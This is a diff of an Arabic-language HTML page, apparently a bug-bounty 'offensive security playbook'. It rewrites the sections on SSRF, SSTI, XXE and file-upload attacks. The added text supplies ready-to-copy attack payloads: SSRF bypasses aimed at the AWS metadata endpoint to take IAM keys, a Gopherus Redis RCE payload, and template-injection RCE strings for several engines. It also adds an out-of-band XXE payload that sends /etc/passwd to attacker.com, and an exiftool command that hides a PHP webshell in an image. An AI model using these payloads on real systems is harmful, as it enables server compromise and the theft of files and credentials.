@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=8">
-  <link rel="stylesheet" href="css/methodology.css?v=8">
+  <link rel="stylesheet" href="css/style.css?v=9">
+  <link rel="stylesheet" href="css/methodology.css?v=9">
 
   
 
@@ -1864,131 +1864,204 @@ sqlmap -u "https://target.com/id=1" --technique=T --time-sec=5 --threads=10 --no
 
       <!-- Phase 9: SSRF Workflow -->
       <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #0284c7;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📡</span> Server-Side Request Forgery (SSRF)</h2>
-          <p class="hero-tagline">فحص المدخلات البرمجية التي تطلب روابط خارجية واستغلالها لقراءة الخواص الداخلية للشبكة</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">📡</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">Server-Side Request Forgery (SSRF)</h2>
+            <p class="phase-module-tagline">تحويل خادم الهدف إلى سلاح موجه لاختراق شبكته الداخلية والسحابة (AWS/GCP)</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 2-5 Hours</span>
+              <span class="badge-difficulty bg-high">Critical</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 SSRF Overview & Detection</h3></div>
-          <p>تحدث عندما يقوم الخادم بجلب رابط خارجي يحدده المهاجم دون تعقيم للرابط.</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن رابط خادم خارجي مثل Interact.sh أو رابط داخلي <code>http://127.0.0.1:80/</code>.</li>
-            <li>✔ <strong>Metadata targets:</strong> استدعاء روابط السحابة العامة مثل AWS <code>http://169.254.169.254/latest/meta-data/</code>.</li>
-          </ul>
+          <div class="card-header"><h3>💡 SSRF Hunting & Bypasses</h3></div>
+          <p>تحدث الثغرة عندما يطلب الخادم روابط خارجية نيابة عنك دون فلترة. لكن السيرفرات اليوم تستخدم فلاتر لمنع طلب الـ localhost. إليك كيف تكسرها:</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>تكتيك التخطي (Bypass Tactic)</th>
+                <th>الحمولة (Payload)</th>
+                <th>الهدف (Target)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>IPv4/IPv6 Encodings</strong></td>
+                <td><code>http://0177.0.0.1/</code> أو <code>http://[::1]/</code></td>
+                <td>تجاوز فلاتر الكلمات الدليلية التي تمنع 127.0.0.1</td>
+              </tr>
+              <tr>
+                <td><strong>DNS Rebinding</strong></td>
+                <td>استخدام <code>http://make-127.0.0.1-rebind.it/</code></td>
+                <td>تخطي التحقق من الـ IP الخارجي وقت الطلب (Time of Check)</td>
+              </tr>
+              <tr>
+                <td><strong>Cloud Metadata (AWS)</strong></td>
+                <td><code>http://169.254.169.254/latest/meta-data/</code></td>
+                <td>سحب مفاتيح السحابة والمتحكمات الإدارية (IAM Keys).</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Capital One AWS SSRF leak</h3></div>
-          <p><strong>الوصف (Scenario):</strong> اختراق بنك Capital One الشهير عبر استغلال ثغرة SSRF على الـ WAF لقراءة خادم الميتاداتا.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> استدعاء رابط الميتاداتا لجلب مفاتيح إدارة الهوية السحابية (IAM Credentials) وسحب بيانات 100 مليون عميل.</p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🔥 Gopher Protocol (RCE via SSRF)</h3></div>
+          <p>إذا كان التطبيق يدعم بروتوكول <code>gopher://</code>، يمكنك إرسال طلبات متعددة الأسطر لخدمات داخلية (Redis, Memcached, MySQL) والحصول على <strong>RCE</strong> مباشر!</p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</div>
+            <div class="cmd-ui-top"><span class="text-secondary"># استخدام أداة Gopherus لتوليد حمولة تخترق Redis عبر SSRF:</span>
+gopherus --exploit redis
+
+<span class="text-secondary"># Payload الناتج للحقن:</span>
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall...</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('gopherus --exploit redis', this)">📋 Copy Command</button>
+            </div>
           </div>
-          <p><strong>الأثر (Impact):</strong> تسوية قضائية بقيمة 250 مليون دولار.</p>
+        </div>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Capital One AWS Breach</h3></div>
+          <p><strong>الوصف (Scenario):</strong> اختراق تاريخي لبنك Capital One نتج عنه تسريب بيانات 100 مليون بطاقة ائتمان.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> المهاجمة استغلت ثغرة SSRF في جدار الحماية (ModSecurity) لقراءة خادم الميتاداتا الخاص بـ AWS وسحب بيانات تفويض (IAM Role Credentials).</p>
+          <p><strong>الأثر والمكافأة:</strong> <span class="text-neon-red">تسوية قانونية بقيمة 190 مليون دولار!</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p9" onclick="markPhaseComplete('p9','p_ssti')">
-          ✅ Mark Phase Complete — SSRF Workflow Done → Proceed to SSTI Workflow
+          ✅ Mark Phase Complete — SSRF Workflow Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase SSTI Workflow -->
       <div class="meth-content-view" id="meth-content-p_ssti" style="display: none; --tool-color: #ff0055;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🧬</span> SSTI (Server-Side Template Injection)</h2>
-          <p class="hero-tagline">منهجية اكتشاف واستغلال ثغرات حقن القوالب البرمجية على الخادم للوصول إلى RCE</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">🧬</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">SSTI (Server-Side Template Injection)</h2>
+            <p class="phase-module-tagline">حقن القوالب البرمجية للحصول على تنفيذ أوامر مباشر (RCE)</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-2 Hours</span>
+              <span class="badge-difficulty bg-high">Critical</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
           <div class="card-header"><h3>💡 SSTI Detection Methodology</h3></div>
-          <p>تبدأ الثغرة عندما يتم دمج مدخلات المستخدم مباشرة داخل محرك القوالب (Template Engine) بدلاً من تمريرها كبيانات آمنة.</p>
-          <p>لحقن العمليات الرياضية ورصد النتيجة:</p>
+          <p>الـ SSTI يختلف عن الـ XSS بأنه يُنفذ في <strong>السيرفر</strong> وليس في المتصفح. اختبر المدخلات بحقن عمليات رياضية صريحة:</p>
           <ul class="t-check-list">
-            <li>✔ حقن <code>${7*7}</code> أو <code>{{7*7}}</code> في المدخلات.</li>
-            <li>✔ إذا عادت الاستجابة بالرقم <strong>49</strong>، فإن الخادم مصاب بـ SSTI مؤكدة.</li>
+            <li>✔ قم بحقن <code>${7*7}</code> أو <code>{{7*7}}</code> في خانات الأسماء، الرسائل، أو القوالب البريدية.</li>
+            <li>✔ إذا انعكست النتيجة <strong>49</strong> في الصفحة، فأنت أمام SSTI مؤكد ويجب أن تصعده إلى RCE.</li>
           </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🎯 Engine Payloads Comparison</h3></div>
+          <div class="card-header"><h3>🎯 Pro Engine Payloads (From Detection to RCE)</h3></div>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
                 <th>المحرك (Engine)</th>
                 <th>لغة البرمجة</th>
-                <th>حمولة الاختبار (Test Payload)</th>
-                <th>حمولة RCE (Remote Code Execution)</th>
+                <th>حمولة اختبار سريعة (Test Payload)</th>
+                <th>RCE Payload (تنفيذ أوامر)</th>
               </tr>
             </thead>
             <tbody>
               <tr>
                 <td><strong>Jinja2 / Twig</strong></td>
                 <td>Python / PHP</td>
-                <td><code>{{7*7}}</code></td>
+                <td><code>{{7*'7'}}</code> ← 7777777</td>
                 <td><code>{{self.__init__.__globals__.__specs__['os'].popen('id').read()}}</code></td>
               </tr>
               <tr>
-                <td><strong>Thymeleaf</strong></td>
+                <td><strong>FreeMarker</strong></td>
                 <td>Java</td>
-                <td><code>${7*7}</code></td>
-                <td><code>${#rt.exec('id')}</code></td>
+                <td><code>${7*7}</code> ← 49</td>
+                <td><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }</code></td>
               </tr>
               <tr>
-                <td><strong>Mako</strong></td>
-                <td>Python</td>
-                <td><code>${7*7}</code></td>
-                <td><code>${os.system('id')}</code></td>
+                <td><strong>NodeJS (Pug/Jade)</strong></td>
+                <td>JavaScript</td>
+                <td><code>#{7*7}</code> ← 49</td>
+                <td><code>#{global.process.mainModule.require('child_process').execSync('id')}</code></td>
               </tr>
             </tbody>
           </table></div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Flask profile name SSTI RCE</h3></div>
-          <p><strong>الوصف (Scenario):</strong> حقن العمليات الرياضية في خانة الاسم الشخصي للمستخدم في تطبيق مصمم بـ Flask.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> انعكاس الاسم بالنتيجة الحسابية 49، ثم تحويل الحمولة لاستدعاء كيانات بايثون العامة لتنفيذ الأوامر.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,000</span></p>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Uber Profile SSTI</h3></div>
+          <p><strong>الوصف (Scenario):</strong> اكتشف باحث أمني أن تغيير اسم الحساب في منصة Uber يؤدي لانعكاسه داخل قالب بريد إلكتروني تلقائي يتم إرساله.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> قام الباحث بوضع Payload لـ Jinja2 في خانة الاسم الأول. وعندما أرسل النظام البريد، نفذ السيرفر كود الـ Python الداخلي وأعطى الباحث RCE كامل.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$10,000</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p_ssti" onclick="markPhaseComplete('p_ssti','p_xxe')">
-          ✅ Mark Phase Complete — SSTI Workflow Done → Proceed to XXE Injection
+          ✅ Mark Phase Complete — SSTI Workflow Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase XXE Injection -->
       <div class="meth-content-view" id="meth-content-p_xxe" style="display: none; --tool-color: #14b8a6;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🕸️</span> XML External Entity (XXE)</h2>
-          <p class="hero-tagline">مسار استغلال ثغرات معالجة ملفات XML لقراءة الملفات الداخلية للسيرفر</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 XXE Overview & Payloads</h3></div>
-          <p>تحدث عند تكوين محلل XML غير آمن يسمح باستدعاء كيانات خارجية بالملف.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE test [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]&gt;
-&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE test [\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;', this)">📋 Copy</button>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">🕸️</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">XML External Entity (XXE)</h2>
+            <p class="phase-module-tagline">اختراق محللات الـ XML لقراءة ملفات النظام الحساسة أو إطلاق هجمات SSRF</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-3 Hours</span>
+              <span class="badge-difficulty bg-high">High</span>
             </div>
           </div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: File read via XML Invoice parse</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تطبيق محاسبي يسمح للمستخدم برفع فواتير بصيغة XML لمعالجتها واستخراج الإجمالي.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تعديل ملف الـ XML لحقن كيان خارجي (External Entity) يشير لملفات النظام وعرض محتواها بالصفحة.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>💡 Blind & OOB (Out-of-Band) XXE Strategy</h3></div>
+          <p>في كثير من الأحيان، السيرفر يعالج ملف الـ XML لكنه **لا يظهر لك النتيجة** على الشاشة. الحل هو إجبار السيرفر على إرسال الملفات التي قرأها إلى خادم تملكه (OOB XXE).</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top"><span class="text-secondary"># الحمولة الخبيثة (يتم رفعها أو إرسالها بالطلب):</span>
+&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE ANY [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+  %send;
+]&gt;
+
+<span class="text-secondary"># محتوى ملف evil.dtd الموجود في سيرفر المهاجم (يقوم بإرسال الملف المقروء كمتغير بمسار URL):</span>
+&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://attacker.com/?leak=%file;'&gt;"&gt;
+%all;</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('<!DOCTYPE ANY [ <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; %send; ]>', this)">📋 Copy OOB XXE</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🥷 Hidden XXE Surfaces (الأماكن الخفية للثغرة)</h3></div>
+          <ul class="t-check-list">
+            <li>✔ <strong>ملفات الأوفيس:</strong> هل الموقع يسمح برفع ملفات <code>.docx</code> أو <code>.xlsx</code>؟ قم بفك ضغط الملف، وعدل ملف <code>[Content_Types].xml</code>، واحفظه مجدداً للقيام بـ XXE مخفي.</li>
+            <li>✔ <strong>تعديل الـ Content-Type:</strong> إذا كان الـ API يستقبل JSON <code>{"name":"abdo"}</code>، جرب تغييره في Burp إلى <code>application/xml</code> وأرسل بياناتك كـ XML.</li>
+            <li>✔ <strong>ملفات الصور (SVG):</strong> الصور بصيغة SVG مبنية بالأساس على XML، ويمكن وضع حمولات XXE داخلها لسرقة الملفات عند محاولة عرضها أو معالجتها.</li>
+          </ul>
+        </div>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Bypassing Image Uploads via SVG XXE</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تطبيق يسمح برفع الصور الرمزية ولكنه يفحص الصور ويمنع رفع أي سكريبتات.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> المهاجم قام بصناعة صورة بصيغة <code>.svg</code> تحتوي في أكوادها على حمولة XXE صريحة لقراءة <code>/etc/hostname</code>. بمجرد قيام السيرفر بمعالجة مقاسات الصورة وعرضها، تم استدعاء الملف وعرضه كجزء من ألوان الصورة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$5,000</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p_xxe" onclick="markPhaseComplete('p_xxe','p10')">
-          ✅ Mark Phase Complete — XXE Injection Done → Proceed to IDOR Testing
+          ✅ Mark Phase Complete — XXE Injection Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 10: IDOR Testing -->
       <div class="meth-content-view" id="meth-content-p10" style="display: none; --tool-color: #10b981;">
@@ -2048,32 +2121,54 @@ GET /api/profile/VICTIM_ID.json</div>
 
       <!-- Phase 11: File Upload Exploits -->
       <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📤</span> File Upload Exploits</h2>
-          <p class="hero-tagline">رفع ملفات خبيثة (Webshells) لتنفيذ الأوامر على خادم الهدف</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">📤</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">Advanced File Upload Exploits</h2>
+            <p class="phase-module-tagline">تجاوز الفلاتر الصارمة، تغيير الـ Magic Bytes، وتنفيذ الشيل الخبيث (Webshell RCE)</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-3 Hours</span>
+              <span class="badge-difficulty bg-high">High</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Bypassing Extensions Filters</h3></div>
-          <p>طرق تخطي حظر رفع ملفات الـ PHP:</p>
+          <div class="card-header"><h3>🛠️ Hardcore Bypassing Arsenal (الأسلحة الثقيلة)</h3></div>
+          <p>السيرفرات اليوم لا تعتمد فقط على امتداد الملف. لرفع Webshell، استخدم التكتيكات التالية بالترتيب المدمج:</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Alternative Extensions:</strong> رفع بصيغ بديلة مثل <code>.phtml</code> or <code>.php5</code> or <code>.phar</code>.</li>
-            <li>✔ <strong>Double Extensions:</strong> رفع باسم مثل <code>image.png.php</code>.</li>
-            <li>✔ <strong>MIME-Type bypass:</strong> تعديل الـ Content-Type في الطلب إلى <code>image/jpeg</code> بدلاً من <code>application/x-php</code>.</li>
+            <li>✔ <strong>1. Magic Bytes Manipulation:</strong> الفلاتر تقرأ أول بايتات من الملف للتأكد من أنه صورة. أضف <code>GIF89a;</code> في أول سطر داخل ملف الـ PHP الخاص بك ليظن الخادم أنه ملف GIF صالح!</li>
+            <li>✔ <strong>2. Null Byte Injection:</strong> إذا كان الفلتر يمنع <code>.php</code>، جرب حقن بايت صفري في الاسم: <code>shell.php%00.jpg</code>. الخادم سيحفظه كـ <code>shell.php</code>.</li>
+            <li>✔ <strong>3. Exotic Extensions:</strong> لا تجرب فقط <code>.php</code>. الخوادم قد تنسى فلترة الامتدادات الغريبة مثل: <code>.phtml</code>, <code>.php5</code>, <code>.shtml</code>, <code>.asa</code>, <code>.cer</code>.</li>
           </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: PHP Webshell upload via extension bypass</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تطبيق يسمح للمستخدم برفع صورته الشخصية لكنه لا يعقم الملفات المرفوعة بشكل كافٍ.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تغيير امتداد الملف لـ <code>.phtml</code> وتعديل الـ Content-Type إلى <code>image/png</code> لتنفيذ أوامر النظام RCE.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,500</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚙️ Tool Specifications: ExifTool Polyglots</h3></div>
+          <p>طريقة مرعبة لزرع الـ PHP Webshell بداخل (Metadata) الصورة الحقيقية. الخادم سيرى صورة 100% صالحة، لكن بمجرد زيارة مسارها كـ PHP سيتم تنفيذ الأوامر.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top"># حقن حمولة PHP داخل تعليق الصورة (Comment metadata):
+exiftool -Comment="&lt;?php system(\$_GET['cmd']); ?&gt;" innocent_image.jpg
+
+# ثم قم بتغيير اسم الصورة لاحقاً في Burp إلى: innocent_image.php.jpg</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('exiftool -Comment=\"&lt;?php system(\\$_GET[\'cmd\']); ?&gt;\" innocent_image.jpg', this)">📋 Copy Exiftool</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: ImageMagick RCE (ImageTragick)</h3></div>
+          <p><strong>الوصف (Scenario):</strong> موقع ضخم يسمح برفع صور المستخدمين ويقوم بتعديل مقاساتها باستخدام مكتبة ImageMagick دون فحص امتداد داخلي.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> المهاجم قام برفع ملف نصي عادي مع امتداد <code>.jpg</code> ومحتواه الفعلي هو كود برمجي بصيغة <code>MVG</code> يستدعي تنفيذ أمر خارجي (RCE). بسبب ثغرة (ImageTragick)، المكتبة نفذت الملف.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$12,000</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p12')">
-          ✅ Mark Phase Complete — File Upload Exploits Done → Proceed to Race Conditions
+          ✅ Mark Phase Complete — File Upload Exploits Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 12: Race Conditions -->
       <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;">
